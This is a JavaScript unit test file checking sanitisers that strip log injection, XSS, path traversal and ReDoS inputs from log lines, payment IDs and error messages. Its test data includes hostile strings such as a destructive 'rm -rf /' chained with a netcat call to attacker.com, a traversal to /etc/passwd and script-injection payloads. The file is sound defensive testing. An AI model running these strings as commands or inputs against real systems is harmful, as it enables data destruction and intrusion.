import { expect } from 'chai';
import { sanitizeForLog, sanitizePaymentId, sanitizeError, sanitizeAgainstLogInjection, sanitize } from '../../examples/utils/security.js';

describe('Examples Security Utils', () => {
    describe('sanitizeForLog', () => {
        it('should remove control characters and ANSI codes', () => {
            const input = 'test\u001b[31mcolored\u001b[0mtext';
            const result = sanitizeForLog(input);
            expect(result).to.equal('testcoloredtext');
        });

        it('should replace newlines with spaces', () => {
            const input = 'line1\nline2\r\nline3';
            const result = sanitizeForLog(input);
            expect(result).to.equal('line1 line2 line3');
        });

        it('should remove HTML/XML characters', () => {
            const input = 'test<script>alert(1)</script>content';
            const result = sanitizeForLog(input);
            expect(result).to.equal('test_SCRIPT_content');
        });

        it('should limit length to 100 characters', () => {
            const longText = 'x'.repeat(200);
            const result = sanitizeForLog(longText);
            expect(result).to.have.length(100);
        });

        it('should convert non-strings to strings', () => {
            const result = sanitizeForLog(12345);
            expect(result).to.equal('12345');
        });

        it('should handle empty string', () => {
            const result = sanitizeForLog('');
            expect(result).to.equal('');
        });
    });

    describe('sanitizePaymentId', () => {
        it('should allow valid payment ID characters', () => {
            const input = 'pay_abc123-DEF_456';
            const result = sanitizePaymentId(input);
            expect(result).to.equal('pay_abc123-DEF_456');
        });

        it('should remove invalid characters', () => {
            const input = 'pay_abc<>123"456&xyz';
            const result = sanitizePaymentId(input);
            expect(result).to.equal('pay_abc123456xyz');
        });

        it('should limit length to 50 characters', () => {
            const longId = 'pay_' + 'x'.repeat(100);
            const result = sanitizePaymentId(longId);
            expect(result).to.have.length(50);
        });

        it('should return fallback for non-strings', () => {
            const result = sanitizePaymentId(null);
            expect(result).to.equal('invalid_payment_id');
        });

        it('should handle empty string', () => {
            const result = sanitizePaymentId('');
            expect(result).to.equal('invalid_payment_id');
        });
    });

    describe('sanitizeError', () => {
        it('should remove control characters and ANSI codes', () => {
            const input = 'Error: \u001b[31mFailed\u001b[0m to process';
            const result = sanitizeError(input);
            expect(result).to.equal('Error: Failed to process');
        });

        it('should replace newlines with spaces', () => {
            const input = 'Error:\r\nLine 1\nLine 2';
            const result = sanitizeError(input);
            expect(result).to.equal('Error: Line 1 Line 2');
        });

        it('should redact sensitive information', () => {
            const input = 'Error: Invalid password "secret123" and token xyz';
            const result = sanitizeError(input);
            expect(result).to.equal('Error: Invalid _REDACTED_ _REDACTED_123 and _REDACTED_ xyz');
        });

        it('should limit length to 200 characters', () => {
            const longError = 'Error: ' + 'x'.repeat(300);
            const result = sanitizeError(longError);
            expect(result).to.have.length.at.most(200);
        });

        it('should return fallback for non-strings', () => {
            const result = sanitizeError(null);
            expect(result).to.equal('Unknown error');
        });

        it('should handle empty string', () => {
            const result = sanitizeError('');
            expect(result).to.equal('');
        });
    });

    describe('Security Integration Tests', () => {
        it('should prevent log injection attacks', () => {
            const maliciousInput = 'normal\u001b[0m\nINJECTED LOG LINE\u001b[31m';
            const result = sanitizeForLog(maliciousInput);
            
            // Should not contain control characters or newlines
            expect(result).to.not.include('\n');
            expect(result).to.equal('normal INJECTED LOG LINE');
        });

        it('should prevent XSS in payment IDs', () => {
            const xssPayload = 'pay_<script>alert("xss")</script>';
            const result = sanitizePaymentId(xssPayload);
            
            // Should only contain safe characters
            expect(result).to.equal('pay_scriptalertxssscript');
        });

        it('should handle multiple sanitization layers', () => {
            const complexInput = 'pay_[31m<script>\nalert(1)\n</script>[0m_test';
            const logSafe = sanitizeForLog(complexInput);
            const idSafe = sanitizePaymentId(complexInput);
            
            // Both should be safe but different
            expect(logSafe).to.not.include('\n');
            expect(idSafe).to.match(/^[a-zA-Z0-9_-]*$/);
        });
    });

    describe('Advanced Log Injection Protection', () => {
        it('should prevent JavaScript injection', () => {
            const jsInjection = 'user_input<script>alert("pwned")</script>more_text';
            const result = sanitizeAgainstLogInjection(jsInjection);
            expect(result).to.equal('user_input_SCRIPT_REMOVED_more_text');
            expect(result).to.not.include('<script>');
        });

        it('should prevent protocol injection', () => {
            const protocolInjection = 'javascript:alert("xss") data:text/html,<script>';
            const result = sanitizeAgainstLogInjection(protocolInjection);
            expect(result).to.include('_PROTO_');
            expect(result).to.not.include('javascript:');
        });

        it('should prevent template literal injection', () => {
            const templateInjection = 'user_${process.exit()} more ${require("fs")}';
            const result = sanitizeAgainstLogInjection(templateInjection);
            expect(result).to.include('_TEMPLATE_EXPR_');
            expect(result).to.not.include('${');
        });

        it('should prevent event handler injection', () => {
            const eventInjection = 'text onclick="alert(1)" onload="malicious()"';
            const result = sanitizeAgainstLogInjection(eventInjection);
            // New implementation removes quotes and special chars but keeps the pattern recognizable
            expect(result).to.not.include('onclick="');
            expect(result).to.not.include('onload="');
            expect(result).to.equal('text onclick=alert1 onload=malicious');
        });

        it('should prevent command injection patterns', () => {
            const cmdInjection = 'user; rm -rf / && echo "pwned" | nc attacker.com';
            const result = sanitizeAgainstLogInjection(cmdInjection);
            expect(result).to.not.include(';');
            expect(result).to.not.include('|');
            expect(result).to.not.include('&');
        });

        it('should prevent path traversal in logs', () => {
            const pathTraversal = 'user/../../../etc/passwd';
            const result = sanitizeAgainstLogInjection(pathTraversal);
            expect(result).to.include('_PATH_TRAVERSAL_');
            expect(result).to.not.include('../');
        });

        it('should remove comments that could hide malicious code', () => {
            const commentInjection = 'normal /* hidden malicious code */ text // more hidden';
            const result = sanitizeAgainstLogInjection(commentInjection);
            expect(result).to.include('_COMMENT_');
            expect(result).to.not.include('/*');
            expect(result).to.not.include('//');
        });

        it('should handle Unicode and hex escapes', () => {
            const escapeInjection = 'text\\u003cscript\\u003e\\x3cimg\\x3e';
            const result = sanitizeAgainstLogInjection(escapeInjection);
            expect(result).to.not.include('\\u');
            expect(result).to.not.include('\\x');
        });

        it('should prevent log forging with newline injection', () => {
            const logForging = 'valid_user\n2024-01-01 ADMIN login successful\nmalicious_entry';
            const result = sanitizeAgainstLogInjection(logForging);
            expect(result).to.not.include('\n');
            expect(result).to.equal('valid_user 2024-01-01 ADMIN login successful malicious_entry');
        });

        it('should limit length to prevent buffer overflow', () => {
            const longPayload = 'A'.repeat(1000);
            const result = sanitizeAgainstLogInjection(longPayload);
            expect(result.length).to.be.at.most(150);
        });
    });

    describe('Anti-DoS and ReDoS Protection', () => {
        it('should handle extremely large inputs with hard cap', () => {
            // Create a massive string that could cause DoS
            const massiveInput = 'A'.repeat(500000); // 500KB
            const result = sanitizeAgainstLogInjection(massiveInput);
            
            // Should be capped and processed without hanging
            expect(result.length).to.be.lessThan(200000); // Hard cap should apply
            expect(result.length).to.be.at.most(150); // Final length limit
        });

        it('should handle pathological regex patterns without hanging', () => {
            // Patterns that could cause catastrophic backtracking
            const pathologicalInputs = [
                'a'.repeat(1000) + '!', // Could cause ReDoS with nested quantifiers
                '{'.repeat(500) + '}',  // Unbalanced delimiters
                '${'.repeat(200) + 'test' + '}'.repeat(200), // Nested templates
                '<script>' + 'x'.repeat(1000) + '</script>'.repeat(100)
            ];

            pathologicalInputs.forEach((input, i) => {
                const start = Date.now();
                const result = sanitizeAgainstLogInjection(input);
                const duration = Date.now() - start;
                
                // Should complete in reasonable time (< 100ms for even pathological cases)
                expect(duration).to.be.lessThan(100, `Input ${i} took too long: ${duration}ms`);
                expect(result).to.be.a('string');
                expect(result.length).to.be.at.most(150);
            });
        });

        it('should use linear-time template replacement', () => {
            const nestedTemplates = '${'.repeat(100) + 'code' + '}'.repeat(100);
            const start = Date.now();
            const result = sanitizeAgainstLogInjection(nestedTemplates);
            const duration = Date.now() - start;
            
            expect(duration).to.be.lessThan(50); // Should be very fast
            expect(result).to.include('_TEMPLATE_EXPR_');
            expect(result).to.not.include('${');
        });

        it('should use linear-time script tag removal', () => {
            const massiveScript = '<script>' + 'alert(1);'.repeat(1000) + '</script>';
            const start = Date.now();
            const result = sanitizeAgainstLogInjection(massiveScript);
            const duration = Date.now() - start;
            
            expect(duration).to.be.lessThan(50); // Should be very fast
            expect(result).to.equal('_SCRIPT_REMOVED_');
        });

        it('should handle maximum iteration limits in delimited replacement', () => {
            // Create input that would exceed maxIter limit
            const manyDelimiters = '{{test}}'.repeat(20000); // More than 10000 limit
            const result = sanitizeAgainstLogInjection(manyDelimiters);
            
            // Should handle gracefully without infinite loops
            expect(result).to.be.a('string');
            expect(result.length).to.be.at.most(150);
        });

        it('should prevent guard overflow in stripTagContent', () => {
            // Create input with many script tags to test guard limit  
            const manyScripts = '<script>test</script>'.repeat(15000); // More than 10000 guard
            const result = sanitizeAgainstLogInjection(manyScripts);
            
            // Should handle gracefully 
            expect(result).to.be.a('string');
            expect(result.length).to.be.at.most(150);
        });

        it('should maintain O(n) performance characteristics', () => {
            // Test with progressively larger inputs
            const sizes = [1000, 5000, 10000];
            const times = [];
            
            sizes.forEach(size => {
                const input = 'test<script>alert(1)</script>data'.repeat(size / 30);
                const start = process.hrtime.bigint();
                sanitizeAgainstLogInjection(input);
                const duration = Number(process.hrtime.bigint() - start) / 1000000; // Convert to ms
                times.push(duration);
            });
            
            // Performance should scale roughly linearly (not exponentially)
            // Allow some variance but shouldn't be catastrophic
            expect(times[2]).to.be.lessThan(times[0] * 50); // Not more than 50x slower
        });

        it('should handle malformed HTML without hanging', () => {
            const malformedHtml = '<script<script<script>alert(1)</script></script></script>'.repeat(100);
            const start = Date.now();
            const result = sanitizeAgainstLogInjection(malformedHtml);
            const duration = Date.now() - start;
            
            expect(duration).to.be.lessThan(100);
            expect(result).to.include('_SCRIPT_REMOVED_');
        });

        it('should use linear-time comment removal without ReDoS', () => {
            // Test pathological comment patterns that could cause ReDoS
            const pathologicalComments = [
                '/* ' + 'a'.repeat(10000) + ' */',
                '// ' + 'b'.repeat(10000),
                '/*' + '*/'.repeat(1000),
                '//' + '\n//'.repeat(1000)
            ];

            pathologicalComments.forEach((input, i) => {
                const start = Date.now();
                const result = sanitizeAgainstLogInjection(input);
                const duration = Date.now() - start;
                
                expect(duration).to.be.lessThan(50, `Comment pattern ${i} took too long: ${duration}ms`);
                expect(result).to.include('_COMMENT_');
            });
        });

        it('should use linear-time HTML tag removal without ReDoS', () => {
            // Test pathological HTML patterns that could cause ReDoS with <[^>]*> regex
            const pathologicalHtml = [
                '<'.repeat(10000) + 'text',           // Many < without >
                '<div' + '<'.repeat(5000) + '>',      // Malformed nested <
                '<span>' + '<'.repeat(3000),          // Unclosed non-script tags
                '<<<<<div>content</div>>>>>>'         // Multiple angle brackets
            ];

            pathologicalHtml.forEach((input, i) => {
                const start = Date.now();
                const result = sanitizeAgainstLogInjection(input);
                const duration = Date.now() - start;
                
                expect(duration).to.be.lessThan(50, `HTML pattern ${i} took too long: ${duration}ms`);
                // Should either be processed as HTML tags or handled by other sanitization
                expect(result).to.be.a('string');
                expect(result.length).to.be.at.most(150); // Should be capped
                // Should not contain unprocessed < characters in most cases
                const unprocessedCount = (result.match(/</g) || []).length;
                expect(unprocessedCount).to.be.lessThan(10, `Too many unprocessed < chars: ${unprocessedCount}`);
            });
        });
    });

    describe('Unified Sanitize Function', () => {
        it('should work with different types using convenience functions', () => {
            const maliciousInput = 'pay_<script>alert("hack")</script>123';
            
            // Use convenience functions instead of direct sanitize calls
            const forLog = sanitizeForLog(maliciousInput);
            const forPaymentId = sanitizePaymentId(maliciousInput);
            const forError = sanitizeError(maliciousInput);
            const forStrict = sanitizeAgainstLogInjection(maliciousInput);
            
            // Each type should handle it appropriately
            expect(forPaymentId).to.equal('pay_scriptalerthackscript123');
            expect(forLog).to.equal('pay__SCRIPT_123');
            expect(forError).to.equal('pay__SCRIPT_123');
            expect(forStrict).to.include('_SCRIPT_REMOVED_');
        });

        it('should allow custom options through direct sanitize call', () => {
            const input = 'Very long text that should be truncated at custom length';
            const result = sanitize(input, { 
                type: 'log', 
                maxLength: 20, 
                redactSensitive: false 
            });
            expect(result.length).to.be.at.most(20);
        });

        it('should handle redaction options through direct sanitize call', () => {
            const input = 'User password is secret123';
            const withRedaction = sanitize(input, { 
                type: 'log', 
                maxLength: 100, 
                redactSensitive: true 
            });
            const withoutRedaction = sanitize(input, { 
                type: 'log', 
                maxLength: 100, 
                redactSensitive: false 
            });
            
            expect(withRedaction).to.include('_REDACTED_');
            expect(withoutRedaction).to.not.include('_REDACTED_');
        });
    });
});
